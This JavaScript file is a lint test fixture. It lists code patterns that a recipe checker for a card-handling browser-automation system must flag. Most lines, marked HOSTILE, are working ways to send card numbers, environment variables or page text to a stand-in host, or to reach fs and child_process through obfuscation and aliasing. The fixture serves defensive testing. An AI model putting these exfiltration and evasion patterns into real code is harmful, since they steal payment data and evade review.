// Not a recipe: a catalogue of what the rules must refuse. Each marked line
// below is a way a submitted recipe could take the card off the box, written
// the way someone would actually write it. lint-fixture.mjs asserts that
// EVERY one of those lines is reported — a fixture the lint merely fails as a
// whole proves one rule works and hides the rest.
const page = {};

// 1. obfuscation: the reviewer sees base64, the runtime sees a fetch
eval(atob("ZmV0Y2goImh0dHBzOi8vbW9pIik=")); // HOSTILE
const e = Function("return fetch")(); // HOSTILE
new Function("card", "return fetch('https://moi/?c='+card)"); // HOSTILE

// 2. the module specifier decides what is loaded
const mod = "ch" + "ild_process";
await import(mod); // HOSTILE
require(mod); // HOSTILE
await import("node:fs"); // HOSTILE — a literal, and still not a recipe's import
require("node:child_process"); // HOSTILE

// 3. straight out of the process
await fetch("https://moi/?card=" + process.env.CARD_NUMBER); // HOSTILE
new WebSocket("wss://moi/"); // HOSTILE
new EventSource("https://moi/"); // HOSTILE

// 3b. the same channel, one alias away — what a rule matching call sites misses
const send = fetch; // HOSTILE
await send("https://moi/?c=" + process.env.CARD_NUMBER);
await globalThis["fetch"]("https://moi/"); // HOSTILE
const g = globalThis.fetch; // HOSTILE
const name = "fe" + "tch";
await globalThis[name]("https://moi/"); // HOSTILE
[1].map(fetch); // HOSTILE

// 4. the filesystem and the process table
import fs from "fs"; // HOSTILE
import { exec } from "node:child_process"; // HOSTILE

// 5. reading the card without ever naming it
const key = "CARD_" + "NUMBER";
const stolen = process.env[key]; // HOSTILE
const all = Object.entries(process.env); // HOSTILE
const { TASK, ...everythingElse } = process.env; // HOSTILE

// 6. the last route: in-page code, which allowedDomains does not bound
await page.evaluate(() => fetch("https://moi/", { method: "POST", body: document.body.innerText })); // HOSTILE
await page.evaluate(() => { new Image().src = "https://moi/?c=" + document.querySelector("#card").value; }); // HOSTILE
await page.addInitScript(() => navigator.sendBeacon("https://moi/", localStorage.getItem("card"))); // HOSTILE

// 7. require() under another name — no import statement, same filesystem
const fsAgain = process.getBuiltinModule("node:fs"); // HOSTILE

// 8. the in-page channel held by a variable rather than called in place
await page.evaluate(() => {
  const send = navigator.sendBeacon.bind(navigator); // HOSTILE
  send("https://moi/", document.body.innerText);
});

// 9. the rest of the process object — every one of these is its own spelling
process.binding("fs"); // HOSTILE
process.dlopen({}, "./evil.node"); // HOSTILE
const main = process.mainModule; // HOSTILE
const member = "getBuilt" + "inModule";
process[member]("node:fs"); // HOSTILE

// 10. a second file is a second thing to review, and nobody pinned it
import helper from "./helper.mjs"; // HOSTILE

// 11. in-page code does not need fetch to make the page fetch
await page.evaluate(() => {
  const pixel = document.createElement("img"); // HOSTILE
  pixel.src = "https://moi/?x=" + document.body.innerText; // HOSTILE
  document.querySelector("#x").setAttribute("src", "https://moi/"); // HOSTILE
  document.body.innerHTML = "<img src=https://moi/>"; // HOSTILE
  document.write("<script src=https://moi/></" + "script>"); // HOSTILE
  document.body.insertAdjacentHTML("beforeend", "<img src=https://moi/>"); // HOSTILE
  location.assign("https://moi/"); // HOSTILE
  window.open("https://moi/"); // HOSTILE
});

// 12. reading a sink stays legal — this is how 3-D Secure is detected, and a
// rule that broke it would be switched off within a day.
await page.evaluate(() => {
  const frame = document.querySelector("iframe"); // LEGAL
  const current = location.href; // LEGAL
  return { src: frame?.src || "", here: current, html: document.body.innerText }; // LEGAL
});

// 13. the object in a variable — every rule about its members is now about a
// name nobody uses
const p = process; // HOSTILE
p.getBuiltinModule("node:fs");
const env = process.env; // HOSTILE
Object.entries(env);
const { CARD_NUMBER } = process.env; // HOSTILE

// 14. not hostile — a mistake. An identifier nobody defines throws only when
// its line runs, and trip.com's END log runs after the result is emitted, so
// every check stayed green while the tier would have answered empty.
const endLog = () => KEEP ? "left open" : "END"; // HOSTILE
